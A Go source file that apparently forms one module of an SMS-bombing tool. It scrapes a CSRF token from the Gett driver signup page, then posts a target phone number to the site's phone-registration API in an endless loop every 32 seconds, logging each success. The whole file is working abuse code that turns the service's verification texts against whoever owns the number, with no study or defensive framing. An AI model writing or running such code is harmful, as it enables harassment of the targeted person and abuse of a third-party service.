package main

import (
	"strings"
	"time"

	"github.com/valyala/fasthttp"
)

func gett() {
	reqA := newreq()
	reqB := newreq()

	reqA.SetRequestURI("https://driver.gett.ru/signup/")

	reqB.Header.SetContentType("application/json")
	reqB.Header.SetReferer("https://driver.gett.ru/signup/")
	reqB.SetBodyString(`{"phone":"` + num + `","registration":true}`)
	reqB.SetRequestURI("https://driver.gett.ru/api/login/phone/")
	reqB.Header.SetMethod("POST")

	timeout := time.Second * 32

	var (
		err   error
		token string
		res   = &fasthttp.Response{}
		a, b  int
	)

	if logging > 0 {
		for do {
			err = client.Do(reqA, res)
			if err != nil {
				time.Sleep(timeout)
				continue
			}

			token = string(res.Header.PeekCookie("csrftoken"))
			a = strings.Index(token, "csrftoken=") + 10
			b = strings.Index(token, ";")
			if a == -1 || b == -1 {
				time.Sleep(timeout)
				continue
			}
			token = token[a:b]

			reqB.Header.Set("X-CSRFToken", token)
			reqB.Header.SetCookie("csrftoken", token)

			err = client.Do(reqB, res)
			if err == nil && strings.Index(string(res.Body()), `success":true`) != -1 {
				okLog(smsLog)
			} else {
				errLog(smsLog)
			}
			time.Sleep(timeout)
		}
	} else {
		for do {
			err = client.Do(reqA, res)
			if err != nil {
				time.Sleep(timeout)
				continue
			}

			token = string(res.Header.PeekCookie("csrftoken"))
			a = strings.Index(token, "csrftoken=") + 10
			b = strings.Index(token, ";")
			if a == -1 || b == -1 {
				time.Sleep(timeout)
				continue
			}
			token = token[a:b]

			reqB.Header.SetCookie("csrftoken", token)
			reqB.Header.Set("X-CSRFToken", token)

			client.Do(reqB, nil)
			time.Sleep(timeout)
		}
	}
}
